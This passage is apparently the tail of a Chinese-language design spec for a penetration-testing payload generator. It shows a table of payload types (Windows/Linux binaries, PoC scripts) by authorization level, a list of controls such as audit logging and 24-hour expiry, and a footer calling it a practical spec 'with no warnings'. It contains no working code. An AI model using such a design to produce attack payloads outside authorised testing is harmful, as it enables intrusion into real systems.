| Binary Payload | Windows/Linux | EXE/DLL/ELF/SO | L3 |
| PoC Script | Multi-platform | Python/Ruby/C | L1-L2 |

### 7.2 安全要求

```yaml
Security Requirements:
  - L2/L3 授權檢查
  - 環境隔離 (development/controlled_pentest)
  - 完整審計日誌 (生成/下載/執行)
  - Payload 哈希追蹤
  - 自動過期機制 (24小時)
  - Rate Limiting
```

---

**文檔完成** | 實戰技術規格，無警告 | 2025年11月25日
